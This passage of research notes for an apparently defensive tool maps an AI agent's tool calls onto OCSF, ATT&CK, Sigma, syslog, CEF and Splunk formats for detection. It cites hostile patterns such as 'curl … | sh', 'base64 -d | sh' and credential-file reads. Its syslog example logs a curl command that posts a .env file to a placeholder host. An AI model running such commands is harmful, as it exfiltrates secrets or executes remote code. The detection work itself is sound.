# SIEMless — standards and competitor research

Retrieved 2026-11-07 unless noted. Primary sources only; anything not confirmed against one is
tagged **UNVERIFIED**. Hermes facts come from the local checkout at
`/home/claude/helm120/ha` (upstream `21ae0e1238`, see `docs/BASELINE.md`), not from the web.
Small machine-readable excerpts saved beside this file in `docs/standards/`:

| File | Source |
|---|---|
| `ocsf-1.9.0-excerpt.json` | ocsf/ocsf-schema tag `v1.9.0` (commit `856d462b`, 2026-08-03) |
| `attack-v20.1-excerpt.json` | mitre-attack/attack-stix-data `enterprise-attack.json` (collection 20.1, modified 2026-11-05) |
| `sigma-detection-rule-schema.json`, `sigma-correlation-rules-schema.json` | SigmaHQ/sigma-specification `main` @ `ba9251aa` (2026-06-09) |

Method note: `schema.ocsf.io` and `attack.mitre.org` could not be fetched directly (robots /
provenance blocks), so OCSF and ATT&CK facts were taken from the projects' own GitHub
repositories, which are the sources those sites render. The brief's ATT&CK URLs
(`/techniques/T1698/`, `/T1700/`, `/resources/updates/`) are listed in §11 as blocked.

---

## 1. OCSF

### 1.1 Version — brief VERIFIED

The brief's claim is correct. OCSF **1.9.0** was released **2026-08-03** and is the latest
non-RC release; it adds the `ai_agent` object, `hosted_ai_agent_list`, `charter`, `prompt_text`,
`response_text`, an optional `delegation` on the `ai_operation` profile, a `delegation` object, a
`record_integrity` profile with `attestation` and `prev_event` objects, and new classes User
Management, Role Management, Clipboard Activity, Device Power State Activity.
[ocsf-schema releases](https://github.com/ocsf/ocsf-schema/releases) (retrieved 2026-11-07);
[CHANGELOG v1.9.0](https://github.com/ocsf/ocsf-schema/blob/v1.9.0/CHANGELOG.md) (retrieved 2026-11-07, PRs #1641, #1661, #1665, #1681).
Prior: 1.8.0 (2026-03-18) introduced `ai_operation` profile with `ai_model` and `message_context`.

Set `metadata.version = "1.9.0"` on every event.

### 1.2 Categories (categories.json)

| category_uid | name | caption |
|---|---|---|
| 1 | system | System Activity |
| 2 | findings | Findings |
| 3 | iam | Identity & Access Management |
| 4 | network | Network Activity |
| 5 | discovery | Discovery |
| 6 | application | Application Activity |
| 7 | remediation | Remediation |
| 8 | unmanned_systems | Unmanned Systems |

There is **no AI category** in 1.9.0. AI/agent semantics are carried by the `ai_operation`
*profile* (applicable to classes that list it, e.g. `api_activity` lists `trace`; `email_activity`
lists `ai_operation`) and by the `ai_agent` attribute on `process`, `actor`-reachable objects and
`evidences`. [categories.json](https://github.com/ocsf/ocsf-schema/blob/v1.9.0/categories.json) (retrieved 2026-11-07).

### 1.3 Class map for SIEMless event kinds

`class_uid = category_uid*1000 + class.uid`; `type_uid = class_uid*100 + activity_id` (the
dictionary says producers **must** compute it that way). Required attributes below are the merged
inheritance chain (`base_event` → category base → class). Every class requires
`activity_id, category_uid, class_uid, metadata, severity_id, time, type_uid`; extras are listed.
[events/](https://github.com/ocsf/ocsf-schema/tree/v1.9.0/events), [dictionary.json](https://github.com/ocsf/ocsf-schema/blob/v1.9.0/dictionary.json) (retrieved 2026-11-07).

| SIEMless event | OCSF class (name) | class_uid | activity_id values | Extra required | Recommended worth filling |
|---|---|---|---|---|---|
| Tool invocation (any `pre/post_tool_call`) | API Activity (`api_activity`) | **6003** | 1 Create, 2 Read, 3 Update, 4 Delete, 0 Unknown, 99 Other | `actor`, `api` (`api.operation` required), `src_endpoint` | `dst_endpoint`, `http_request/response`, `status/_id`, `observables`, `resources`; profile `trace` |
| `terminal` / `execute_code` | Process Activity (`process_activity`) | **1007** | 1 Launch, 2 Terminate, 3 Open, 4 Inject, 5 Set User ID | `actor`, `device`, `process` | `exit_code`, `status_id`, `observables` (cmd_line type 13) |
| alt. for `execute_code` bodies | Script Activity (`script_activity`) | 1009 | 1 Execute | `actor`, `device`, `script` (`script_content`, `type_id` required) | `hashes` |
| `read_file` / `write_file` / `patch` | File System Activity (`file_activity`) | **1001** | 1 Create, 2 Read, 3 Update, 4 Delete, 5 Rename, 6 Set Attributes, 7 Set Security, 8 Get Attributes, 9 Get Security, 10 Encrypt, 11 Decrypt, 12 Mount, 13 Unmount, 14 Open | `actor`, `device`, `file` (`file.name`, `file.type_id` required) | `file.path`, `file.hashes`, `file_diff`, `status_id` |
| `web_fetch`/`browser_*`/HTTP tool | HTTP Activity (`http_activity`) | **4002** | 1 Connect, 2 Delete, 3 Get, 4 Head, 5 Options, 6 Post, 7 Put, 8 Trace, 9 Patch … 40 Version Control | none beyond base | `http_request` (`url`, `http_method`, `user_agent`), `dst_endpoint`, `http_status`, `connection_info` |
| generic egress (curl/ssh seen in command text) | Network Activity (`network_activity`) | **4001** | 1 Open, 2 Close, 3 Reset, 4 Fail, 5 Refuse, 6 Traffic, 7 Listen | none beyond base | `dst_endpoint`, `connection_info`, `traffic`, `url` |
| Approval decision (`post_approval_response`, `on_human_input_resolved`) | **no "Authorization" class exists** — use **Authorize Session** (`authorize_session`) 3003 only for privilege grants; for allow/deny of an action use the originating class (API/Process Activity) **plus the `security_control` profile** | 3003 | 1 Assign Privileges, 2 Assign Groups, 3 Assign Roles | `user` | — |
| &nbsp;&nbsp;↳ recommended model | originating class + `security_control` profile | — | — | profile adds `action_id` (0 Unknown, 1 Allowed, 2 Denied, 3 Observed, 4 Modified, 99 Other), `disposition_id` (1 Allowed, 2 Blocked, 8 Approved, 15 Detected, 16 No Action, 17 Logged, 25 Rejected, 26 Unauthorized …), `is_alert`, `policy`, `attacks`, `risk_level_id` | Map `choice=deny`→action 2/disposition 2; `once|session|always`→1/8; `timeout|cancelled`→2/14 Delayed or 25 Rejected; `blocked` tool status→2/2 |
| Scheduled job creation (`cronjob` tool args) | Scheduled Job Activity (`scheduled_job_activity`) | **1006** | 1 Create, 2 Update, 3 Delete, 4 Enable, 5 Disable, 6 Start | `device`, `job` (`job.name`, `cmd_line`, `type_id`: 1 Task Scheduler, 2 Cron, 3 Systemd, 4 Launchd, 99 Other; `run_state_id`) | `updated_job` |
| Software/plugin install (`hermes plugins install` in command text, `pip`, `npm`) | Application Lifecycle (`application_lifecycle`) | **6002** | 1 Install, 2 Remove, 3 Start, 4 Stop, 5 Restart, 6 Enable, 7 Disable, 8 Update | none beyond base | `application` (`name`, `uid`, `owner`) |
| &nbsp;&nbsp;alt. inventory snapshot | Software Inventory Info (`software_info`) | 5020 | 1 Log, 2 Collect | `device` | `package`, `sbom` |
| Config state change (writes to `config.yaml`, `.env`, `SOUL.md`, hook files) | Device Config State Change (`device_config_state_change`) | **5019** | 1 Log, 2 Collect | `device` | `prev_security_states`, `security_states`, `security_level_id`, `state_id` |
| &nbsp;&nbsp;alt. (simpler, truer to Hermes evidence) | File System Activity 1001 activity 3 Update with `file.path` + `unmapped.config_key` | 1001 | 3 | as above | — |
| Detection finding (correlation/rule hit) | Detection Finding (`detection_finding`) | **2004** | 1 Create, 2 Update, 3 Close | `finding_info` (`finding_info.uid` required; `title`, `analytic` recommended) | `evidences[]` (has `ai_agent`, `api`, `process`, `file`, `url`, `job`, `script`), `confidence_id` (1 Low, 2 Medium, 3 High), `is_alert`, `status_id`, `observables`, `resources` |
| Session / subagent delegation | no dedicated class; put `ai_agent` + `delegation` on the event via the `ai_operation` profile and link `parent/child_session_id` in `metadata.correlation_uid` | — | — | — | see §1.4 |
| Event-log tampering (agent clears its own logs) | Event Log Activity (`event_log_actvity` — note upstream typo in `name`) | 1008 | 1 Clear, 2 Delete, 3 Export, 4 Archive, 5 Rotate, 6 Start, 7 Stop, 8 Restart, 9 Enable, 10 Disable | `device` | — |

Notes:
- All **system** classes (1001/1006/1007/1008/1009) require `device` (`device.type_id` required;
  `hostname`, `uid` recommended). Fill it from the Hermes host; without it the event is invalid.
- `api_activity` requires `src_endpoint` (a `network_endpoint`; `port`, `svc_name` recommended, no
  required leaf fields, so `{"svc_name":"hermes-agent"}` validates).
- `actor` has no required leaves; recommended `user`, `process`, `application`. Use
  `actor.application.name="hermes-agent"` and `actor.user` for the gateway `sender_id`.
- `file.type_id`: 1 Regular File, 2 Folder, 7 Symbolic Link, 8 Executable File.

### 1.4 AI / agent / delegation objects (new in 1.8–1.9)

| Object | Required / recommended fields | Use in SIEMless |
|---|---|---|
| `ai_agent` (1.9.0) | recommended `name`, `uid`, `instance_uid`, `version`, `ai_model`, `type_id` (0 Unknown, 1 Native, 2 LangChain, 3 AutoGen, 4 CrewAI, 99 Other); optional `charter` (type `file`: the system prompt / constitution) | `uid`=profile name, `instance_uid`=`session_id`, `type_id=99` + `type="hermes"` (**no Hermes enum value**), `version`=Hermes version |
| `delegation` (1.9.0) | **required `uid`**; recommended `issuer_uid`, `created_time`; optional `parent_uid` | `uid`=`child_session_id` or `tool_call_id` of `delegate_task`, `issuer_uid`=`parent_session_id`, `parent_uid`=`parent_turn_id` |
| `ai_model` (1.8.0) | **required `name`, `ai_provider`**; recommended `version` | from `model`/`provider` in API hooks |
| `message_context` (1.8.0) | `ai_role_id` (1 User, 2 Assistant, 3 Tool, 4 Agent, 5 Orchestrator, 6 Retriever), `prompt_text`, `response_text`, `prompt_tokens`, `completion_tokens`, `total_tokens`, `application`, `service` | token usage from `post_api_request.usage`; **leave `prompt_text`/`response_text` empty by default** (SIEM egress of prompts) |
| `ai_operation` profile | `ai_model` recommended; `ai_agent`, `delegation`, `message_context` optional | add `"ai_operation"` to `metadata.profiles` on every SIEMless event |
| `record_integrity` profile + `attestation` | `attestation_list[]` with `fingerprint`, `prev_event{uid required, type_uid, fingerprint}`, `chain_uid`, `authority_uid`, `signatures` | hash-chain the JSONL export: `prev_event.fingerprint` = previous event hash; this is the standard way to make the log tamper-evident |
| `evidences.ai_agent` (1.9.0, #1681) | recommended | Detection Finding evidence for "agent spawned sub-agent in violation of policy" |
| `process.ai_agent`, `process.hosted_ai_agent_list` | — | mark the Hermes process in `process_activity.actor.process` |

Source: [objects/ai_agent.json](https://github.com/ocsf/ocsf-schema/blob/v1.9.0/objects/ai_agent.json),
[objects/delegation.json](https://github.com/ocsf/ocsf-schema/blob/v1.9.0/objects/delegation.json),
[profiles/ai_operation.json](https://github.com/ocsf/ocsf-schema/blob/v1.9.0/profiles/ai_operation.json),
[profiles/record_integrity.json](https://github.com/ocsf/ocsf-schema/blob/v1.9.0/profiles/record_integrity.json) (all retrieved 2026-11-07).

### 1.5 Cross-cutting attributes

- `metadata` — **required `product` and `version`**; recommended `log_name`, `original_time`,
  `reporter`, `tenant_uid`; optional `correlation_uid`, `event_code`, `extension(s)`, `labels`,
  `log_source`, `profiles`, `uid`, `sequence`. `product.name/vendor_name/version` →
  `"SIEMless" / "ASV Labs" / <plugin version>`. Put `session_id` in `metadata.correlation_uid`,
  `turn_id`/`tool_call_id` in `metadata.labels` or `unmapped`.
- `severity_id`: 0 Unknown, 1 Informational, 2 Low, 3 Medium, 4 High, 5 Critical, 6 Fatal, 99 Other.
- `status_id`: 0 Unknown, 1 Success, 2 Failure, 99 Other (per-class; the dictionary only fixes
  0/99 — class files define 1/2). Hermes `status`: `ok`→1, `error`→2, `blocked`/`cancelled`→99
  with `status="blocked"` and `status_detail`.
- `time`: `timestamp_t` = epoch **milliseconds**; `timezone_offset` recommended.
- `observables[]`: `type_id` **required**, `name` (attribute path) recommended, `value`. Type ids:
  13 cmd_line, 14 country, 15 pid, 16 user_agent, 19 credential_uid, 20 endpoint, 21 user,
  22 email, 23 url, 24 file, 25 process, 26 location, 27 container, 30 fingerprint,
  36 script_content, 37 serial_number, 42 message_uid. **No observable type for hostname/domain
  alone** — use 20 endpoint (`dst_endpoint.hostname`) or 23 url.
- `unmapped` (object): container for source-specific fields; `raw_data` (string) for the
  verbatim payload. Put Hermes-native fields (`turn_id`, `api_request_id`, `pattern_key`,
  `surface`, `choice`, `tool_name`, `hook`) here rather than inventing top-level keys.
- Vendor extensions: register a name + uid in `extensions.md` (999 is reserved for `dev`);
  extension attributes are prefixed `<ext>/attr`. For a hackathon, **do not register**; use
  `unmapped` plus `metadata.extensions[] = {name:"siemless", uid:999, version:"0.1"}` and
  state it is the dev uid. [extensions.md](https://github.com/ocsf/ocsf-schema/blob/v1.9.0/extensions.md) (retrieved 2026-11-07).

### 1.6 Offline validation

- Schema source: `git clone --depth 1 --branch v1.9.0 https://github.com/ocsf/ocsf-schema`
  (`version.json` = `1.9.0`). Compiled JSON Schema per class is normally served by the OCSF
  server at `https://schema.ocsf.io/schema/classes/<name>?profiles=...` and the bundle at
  `https://schema.ocsf.io/export/schema` — **UNVERIFIED this session** (site blocked fetch), so
  the shipped validator should compile from the cloned repo: resolve `extends` chains, merge
  `attributes`, treat `requirement: required` as mandatory, check enum membership and
  `type_uid == class_uid*100 + activity_id`. The excerpt at `docs/standards/ocsf-1.9.0-excerpt.json`
  holds the class_uids, enums, observable ids and object requirements needed for a minimal
  validator without the full repo.
- Python package `ocsf-validator` (ocsf/ocsf-validator) exists upstream — **UNVERIFIED** version/API this session.

---

## 2. MITRE ATT&CK

Source of truth: `enterprise-attack.json` STIX bundle, collection **Enterprise ATT&CK 20.1**,
modified 2026-11-05. [attack-stix-data](https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json) (retrieved 2026-11-07).

### 2.1 Brief VERIFIED, with two corrections

- **T1698 Indirect Prompt Injection** — exists, tactic **Execution**, v1.0, created 2026-09-18,
  platforms Windows, SaaS. Detection strategy DET0942 "Retrieved Instruction with Unauthorized Agent Action".
- **T1699 Direct Prompt Injection** — Execution, v1.0, 2026-09-18 (DET0941).
- **T1700 AI-Enabled Exfiltration** — exists, tactic **Exfiltration**, v1.0, created 2026-09-22
  (DET0927 "Detect AI-Enabled Exfiltration"). Description: agents instructed via T1698/T1699 to
  use sanctioned tools to exfiltrate.
- **T1685.007 Impair Autonomous Defenses** — Defense Impairment, 2026-09-22; T1698's text links
  to it. Use for "agent disables its own guard / telemetry".
- **Correction 1 — tactic rename.** In v20 "Defense Evasion" (TA0005) is now **Stealth**
  (`stealth`), and a new tactic **Defense Impairment** (TA0112, `defense-impairment`) exists.
  Sigma's tag appendix still lists `attack.defense-evasion`, so emit **both** `attack.stealth`
  (ATT&CK-current) and `attack.defense-evasion` (Sigma-validator-current) or pick one and document it.
- **Correction 2 — T1562.001 is REVOKED.** `T1562 Impair Defenses` and all its subs are
  `revoked: true` in 20.1; `T1562.001 Disable or Modify Tools` is revoked-by **T1685 Disable or
  Modify Tools** (Defense Impairment). Do not emit T1562.001 in new rules; emit **T1685** (and
  `T1685.007` for autonomous-defense impairment). `T1562.003` → see `T1690 Prevent Command History Logging`.

### 2.2 Requested IDs (current, non-revoked unless marked)

| ID | Name | Tactic(s) | Notes |
|---|---|---|---|
| T1567 | Exfiltration Over Web Service | exfiltration | v1.5 |
| T1567.001 | Exfiltration to Code Repository | exfiltration | git push to unknown remote |
| T1567.002 | Exfiltration to Cloud Storage | exfiltration | |
| T1567.003 | Exfiltration to Text Storage Sites | exfiltration | pastebin-class hosts |
| T1567.004 | Exfiltration Over Webhook | exfiltration | Discord/Slack/webhook.site URLs |
| T1552 | Unsecured Credentials | credential-access | |
| T1552.001 | Credentials In Files | credential-access | `.env`, `auth.json` reads |
| T1552.002 | Credentials in Registry | credential-access | Windows only |
| T1552.003 | Shell History | credential-access | `.bash_history` read |
| T1552.004 | Private Keys | credential-access | `~/.ssh/id_*` |
| T1552.005 | Cloud Instance Metadata API | credential-access | 169.254.169.254 |
| T1552.006 | Group Policy Preferences | credential-access | |
| T1552.007 | Container API | credential-access | |
| T1552.008 | Chat Messages | credential-access | |
| T1555 | Credentials from Password Stores | credential-access | keychain, `pass`, browser vault |
| T1053 | Scheduled Task/Job | execution, persistence, privilege-escalation | |
| T1053.003 | Cron | same | `cronjob` tool / `crontab -` |
| T1053.005 | Scheduled Task | same | Windows |
| T1053.006 | Systemd Timers | same | |
| T1562.001 | Disable or Modify Tools | **REVOKED → T1685** | |
| T1685 | Disable or Modify Tools | defense-impairment | replacement |
| T1685.007 | Impair Autonomous Defenses | defense-impairment | agent-specific |
| T1027 | Obfuscated Files or Information | stealth | base64 / eval pipes |
| T1140 | Deobfuscate/Decode Files or Information | stealth | `base64 -d \| sh` |
| T1105 | Ingress Tool Transfer | command-and-control | `curl … \| sh`, `wget` |
| T1059 | Command and Scripting Interpreter | execution | |
| T1059.004 | Unix Shell | execution | `terminal` tool |
| T1059.006 | Python | execution | `execute_code` |
| T1071 | Application Layer Protocol | command-and-control | |
| T1071.001 | Web Protocols | command-and-control | |
| T1041 | Exfiltration Over C2 Channel | exfiltration | |
| T1048 / .003 | Exfiltration Over Alternative Protocol / Unencrypted Non-C2 | exfiltration | `nc`, raw TCP |
| T1070.003 | Clear Command History | stealth | |
| T1690 | Prevent Command History Logging | defense-impairment | `HISTFILE=` tricks |
| T1546.004 | Unix Shell Configuration Modification | persistence, privilege-escalation | `.bashrc`, `.zshrc` writes |
| T1195.001 | Compromise Software Dependencies and Development Tools | initial-access | unpinned plugin/pip install |
| T1204.004 | Malicious Copy and Paste | execution | |
| T1005 / T1119 | Data from Local System / Automated Collection | collection | bulk file reads before egress |

Detection Finding mapping: `finding_info.attacks[] = {technique:{uid,name,src_url}, tactic:{uid,name}, version:"20.1"}`.
Tactic IDs: TA0001 initial-access, TA0002 execution, TA0003 persistence, TA0004 privilege-escalation,
TA0005 stealth, TA0006 credential-access, TA0007 discovery, TA0008 lateral-movement, TA0009 collection,
TA0010 exfiltration, TA0011 command-and-control, TA0040 impact, TA0042 resource-development,
TA0043 reconnaissance, **TA0112 defense-impairment**.

---

## 3. Sigma

Source: [sigma-rules-specification.md](https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-rules-specification.md),
[sigma-correlation-rules-specification.md](https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-correlation-rules-specification.md),
[sigma-appendix-tags.md](https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-tags.md) (all retrieved 2026-11-07, repo @ `ba9251aa`).

- **Spec version 2.1.0** (2025-08-02) for both rules and correlation rules. The shipped JSON
  schema for detection rules is still titled "V2.0.0 (2024-08-08)"; the correlation schema is
  "V2.1.0 (2025-07-25)". Schemas: `json-schema/sigma-detection-rule-schema.json`,
  `json-schema/sigma-correlation-rules-schema.json` (copies in `docs/standards/`).
- **Required fields**: `title`, `logsource`, `detection` (with `condition`). Everything else
  (`id` UUIDv4, `name`, `related`, `taxonomy`, `status`, `description`, `license`, `references`,
  `author`, `date`, `modified`, `fields`, `falsepositives`, `level`, `tags`, `scope`) is optional.
  Style: UTF-8, LF, 4-space indent, lowercase keys, single-quoted strings, `.yml`, filenames
  10–70 chars lowercase `[a-z0-9_]`. `date`/`modified` are ISO dates (`2019-10-23`).
- **`level`**: `informational | low | medium | high | critical`.
- **Tags**: lowercase, dot-namespaced: `attack.t1698`, `attack.execution`, `attack.exfiltration`,
  `attack.defense-evasion` (the appendix still uses the pre-v20 tactic names — see §2.1),
  `cve.…`, `d3fend.…`, `detection.threat-hunting`, `tlp.…`.
- **Custom logsource**: `logsource` takes `category`, `product`, `service` (any combination,
  lowercase, `_` for spaces, `.`/`-` allowed) plus free-text `definition`. Converters map these to
  indices via pipelines; the spec explicitly allows a product-specific source. Proposed:

  ```yaml
  logsource:
      product: hermes
      service: siemless          # or category: ai_agent_activity
      definition: 'SIEMless OCSF JSONL (metadata.product.name=SIEMless); fields are OCSF paths'
  detection:
      selection:
          class_uid: 1007
          'process.cmd_line|contains':
              - 'curl '
              - 'wget '
      condition: selection
  ```
  Field names are free-form in Sigma; a pySigma processing pipeline (`field_name_mapping`) maps
  OCSF dotted paths to Splunk/ECS names at conversion time. Default taxonomy is `sigma`; declare
  `taxonomy: ocsf` if we use OCSF paths natively (tools must then handle or map it).
- **Correlation rules ARE in the stable spec (2.0.0+, current 2.1.0)**. A correlation is its
  own YAML document (`mr_` filename prefix recommended) with `title`, `id`, and a `correlation:`
  block: `type` (**mandatory**: `event_count | value_count | temporal | temporal_ordered`;
  the types section also documents `value_sum`, `value_avg`, `value_percentile`), `rules` (ids or
  `name`s of base rules, mandatory), `group-by` (mandatory), `timespan` (e.g. `5m`, `1h`),
  `condition` (`gte/lte/eq` etc. for count types), optional `aliases` for cross-field names and
  `generate` to also emit base-rule matches. Example (temporal_ordered — read secret then egress):

  ```yaml
  title: Credential file read followed by network egress in one Hermes session
  id: 3f3c2f0e-7d1a-4f2a-9f3b-6f1c3a9c0b11
  status: experimental
  correlation:
      type: temporal_ordered
      rules:
          - siemless_credential_file_read
          - siemless_terminal_network_egress
      group-by:
          - metadata.correlation_uid
      timespan: 10m
  level: high
  tags:
      - attack.t1552.001
      - attack.t1700
  ```
  Backends must error on unsupported mandatory features (e.g. ordering not supported) and warn
  on partial support (fixed time buckets).
- **Validation command**: pySigma's API is `sigma.validation.SigmaValidator(validators).validate_rules(rules)`
  returning `SigmaValidationIssue` objects; core validators live in `sigma.validators.core`
  (`IdentifierUniquenessValidator`, `ATTACKTagValidator`, …).
  [pySigma Rule_Validation](https://sigmahq-pysigma.readthedocs.io/en/stable/Rule_Validation.html) (retrieved 2026-11-07).
  `sigma-cli` **4.0.0** (2026-10-28, Python ≥3.11) describes itself as "conversion, check etc.";
  commands verified on its README/PyPI: `sigma convert -t <backend> -p <pipeline> …`,
  `sigma list targets|pipelines|formats`, `sigma plugin list|install <backend>`.
  [sigma-cli PyPI](https://pypi.org/project/sigma-cli), [sigma-cli README](https://github.com/SigmaHQ/sigma-cli) (retrieved 2026-11-07).
  The exact subcommand `sigma check <path>` and its flags (`--fail-on-error`,
  `--validation-config`) were **not visible on the fetched pages → UNVERIFIED**; run `sigma check --help` in CI.
  Note `ATTACKTagValidator` will likely reject `attack.stealth` / `attack.defense-impairment` until
  pySigma updates its tactic list — exclude that validator or use the legacy tactic tag.

---

## 4. Syslog

Source: [RFC 5424](https://datatracker.ietf.org/doc/html/rfc5424), [RFC 5425](https://datatracker.ietf.org/doc/html/rfc5425),
[RFC 6587](https://datatracker.ietf.org/doc/html/rfc6587) (all retrieved 2026-11-07).

- **RFC 5424 layout**: `SYSLOG-MSG = HEADER SP STRUCTURED-DATA [SP MSG]`;
  `HEADER = PRI VERSION SP TIMESTAMP SP HOSTNAME SP APP-NAME SP PROCID SP MSGID`.
  `PRI = "<" (facility*8 + severity) ">"`; VERSION is `1`. NILVALUE `-` for absent fields.
  Limits (printable ASCII): HOSTNAME ≤255, APP-NAME ≤48, PROCID ≤128, MSGID ≤32, SD-NAME ≤32.
  TIMESTAMP is RFC 3339 (`2026-11-07T21:40:00.123Z`).
- **Facilities**: local0–local7 = 16–23 (default **local4 = 20** is conventional for apps;
  configurable). **Severities**: 0 Emergency, 1 Alert, 2 Critical, 3 Error, 4 Warning, 5 Notice,
  6 Informational, 7 Debug. OCSF→syslog: severity_id 6 Fatal→1, 5 Critical→2, 4 High→3,
  3 Medium→4, 2 Low→5, 1 Info→6, 0/99→6.
- **STRUCTURED-DATA**: zero or more `[SD-ID PARAM-NAME="PARAM-VALUE" …]` elements with no
  spaces between elements; `-` if none. SD-IDs are case-sensitive and unique per message;
  non-IANA ids must be `name@<private-enterprise-number>`. In PARAM-VALUE escape `"`→`\"`,
  `\`→`\\`, `]`→`\]`. We have no PEN; use `siemless@32473` (32473 is the RFC's documentation
  example PEN) and say so, or register a PEN (free, IANA) — **PEN status UNVERIFIED**.
- **MSG**: free-form; if UTF-8 it **must** start with BOM `EF BB BF`. Receivers must accept
  480 octets and should accept 2048; longer may be truncated. JSON in MSG therefore needs
  either a compact OCSF event or `is_truncated`; put ids in SD so truncation never loses the join key.
  Example:

  ```
  <164>1 2026-11-07T21:40:00.123Z hermes-mini siemless 4242 OCSF1007 [siemless@32473 class_uid="1007" type_uid="100701" session="8b1c…" turn="t-17" tool="terminal"] \xEF\xBB\xBF{"class_uid":1007,"activity_id":1,"type_uid":100701,"time":1794260400123,"severity_id":3,"metadata":{"version":"1.9.0","product":{"name":"SIEMless","vendor_name":"ASV Labs"}},"process":{"cmd_line":"curl -s https://x.example/p -d @.env"}}
  ```
- **RFC 5425 (TLS)**: port **6514/tcp** (`syslog-tls`), **octet-counting framing** only
  (`MSG-LEN SP SYSLOG-MSG`), TLS 1.2 required, mandatory suite TLS_RSA_WITH_AES_128_CBC_SHA (dated;
  modern receivers negotiate better), peer auth by trust anchor, end-entity fingerprint
  (SHA-1 "sha-1" format must be supported), or subjectAltName dNSName match. Receivers must handle
  2048 and should handle 8192 octets.
- **RFC 6587 (plain TCP, Historic)**: two framings — **octet counting** (`MSG-LEN SP MSG`,
  decimal length, no leading zero; receiver can infer it when the frame starts with a digit) and
  **non-transparent framing** (TRAILER = LF, or app-defined 1–2 octets; NUL and CRLF seen in the
  wild). Non-transparent framing breaks on embedded LF — JSON must be single-line. The IESG note
  says plain TCP is not recommended; default SIEMless to UDP for local collectors, TLS 5425 for
  remote, and offer TCP with octet counting as the compatibility option.

---

## 5. CEF

Source: [Implementing ArcSight CEF, Version 27 (SmartConnectors 24.1, Jan 2024)](https://www.microfocus.com/documentation/arcsight/arcsight-smartconnectors-24.1/pdfdoc/cef-implementation-standard/cef-implementation-standard.pdf) (retrieved 2026-11-07).

- **Header**: `CEF:Version|Device Vendor|Device Product|Device Version|Device Event Class ID|Name|Severity|[Extension]`.
  Version `0` for spec 0.1 (what every SIEM parses); `1` for spec 1.x. Use `CEF:0`.
- **Severity**: integer 0–10 — 0 Unknown, 1–3 Low, 4–6 Medium, 7–8 High, 9–10 Very-High.
  OCSF map: 1 Info→1, 2 Low→3, 3 Medium→5, 4 High→7, 5 Critical→9, 6 Fatal→10.
- **Escaping**: header fields escape `|`→`\|` and `\`→`\\`; extension values escape `=`→`\=` and
  `\`→`\\`; pipes in the extension are literal; newlines only in extension values as `\n`/`\r`.
  Extension = space-separated `key=value`; keys are case-sensitive.
- **Device Event Class ID** = our rule or OCSF `type_uid` (e.g. `100701`); **Name** = rule title.
- **Standard keys** (full name, type, max):
  `src` sourceAddress IP · `dst` destinationAddress IP · `shost`/`dhost` host names 1023 ·
  `spt`/`dpt` ports int · `suser` sourceUserName 1023 · `duser` 1023 · `fname` filename 1023 ·
  `filePath` 1023 · `fsize` int · `fileHash` 255 · `request` requestUrl 1023 ·
  `requestMethod` 1023 · `sproc`/`dproc` process names 1023 · `deviceProcessName` 1023 ·
  `app` applicationProtocol 31 · `act` deviceAction 63 · `outcome` eventOutcome 63 ·
  `msg` message 1023 · `rt` deviceReceiptTime (ms epoch or `MMM dd yyyy HH:mm:ss`) ·
  `cat` deviceEventCategory 1023 · `dvc` deviceAddress · `dvchost` deviceHostName 100 ·
  `externalId` 40 · `cs1`–`cs6` deviceCustomString 4000 with `cs1Label`–`cs6Label` 1023 ·
  `cn1`–`cn3` long with `cn1Label` · `flexString1/2` 1023 + label 128 · `deviceCustomDate1`.
  There is **no `fpath` or `proc` key** (common mistake) — use `filePath`, `sproc`/`deviceProcessName`.
- SIEMless mapping: `cs1Label=session_id cs1=…`, `cs2Label=turn_id`, `cs3Label=tool_name`,
  `cs4Label=attack_technique cs4=T1700`, `cs5Label=ocsf_type_uid`, `cn1Label=duration_ms`,
  `act=` Hermes status/choice, `outcome=` success/failure, `externalId=` tool_call_id (≤40).

---

## 6. Splunk HEC

Source: [Format events for HEC](https://help.splunk.com/en/splunk-enterprise/get-data-in/collect-http-event-data/format-events-for-http-event-collector) (page updated 2026-02-18),
[About HEC indexer acknowledgment](https://help.splunk.com/en/splunk-enterprise/get-data-in/collect-http-event-data/about-http-event-collector-indexer-acknowledgment) (both retrieved 2026-11-07).

- **Endpoints**: `POST /services/collector/event` (JSON envelope; also where `fields` must go)
  and `POST /services/collector/raw` (raw text; `X-Splunk-Request-Channel: <GUID>` header or
  `?channel=` **required**; raw lines must not span requests). Port 8088 appears in all examples
  (default **UNVERIFIED** from this page; it is the documented inputs.conf default elsewhere).
  Query-string auth `?token=` only if `allowQueryStringAuth = true` on the token.
- **Auth**: `Authorization: Splunk <hec_token>` (or basic auth `x:<token>`).
- **Envelope**: `{"time": <epoch sec[.ms]>, "host", "source", "sourcetype", "index", "fields": {flat index-time fields}, "event": <string|number|object>}`.
  Omitted metadata falls back to token defaults; `index` must be on the token's allowed list.
  For OCSF send `"sourcetype":"ocsf:<class_name>"` or a single `siemless:ocsf` sourcetype with
  `event` = the OCSF object; `time` from `time/1000`.
- **Batching**: concatenate multiple JSON objects in one body (or a JSON array); request-level
  metadata applies to all. Splunk recommends batching for throughput.
- **Ack mode**: per-token `useACK=true` (Enterprise only); every request must carry a channel GUID;
  response `{"ackID": n}`; poll `POST /services/collector/ack` with `{"acks":[0,1,2]}` →
  `{"acks":{"0":true,…}}`; `true` = replicated (not necessarily indexed), then deleted (re-query → false).
  Client guidance: resend after ~5 min without ack, mark as possible duplicate, poll ~10 s.
  Limits: 1,000,000 pending acks per channel, 1,000,000 channels, 10,000,000 pending total;
  `ackIdleCleanup`/`maxIdleTime=600`.
- **Size limits**: `max_content_length` (inputs.conf `[http]`) — the fetched pages do not state
  the default → **UNVERIFIED** (commonly 800 MB post-6.5; keep batches ≤ 1 MB and ≤ 100 events).
- **Token setup**: Settings → Data Inputs → HTTP Event Collector → New Token (name, source,
  sourcetype, allowed indexes, "Enable indexer acknowledgment"); or `inputs.conf` stanza
  `[http://<name>] token=<GUID> index=… sourcetype=… useACK=…`; global enable under the HEC
  "Global Settings" (`disabled=0`, port). The exact UI path text is **UNVERIFIED** this session.
- Splunk CIM / OCSF: Splunk has an OCSF extension uid 997 in OCSF's registry; Splunk's own
  OCSF add-on status **UNVERIFIED**.

---

## 7. Wazuh

Source: [JSON decoder](https://documentation.wazuh.com/current/user-manual/ruleset/decoders/json-decoder.html),
[Custom rules (4.8)](https://documentation.wazuh.com/4.8/user-manual/ruleset/rules/custom.html),
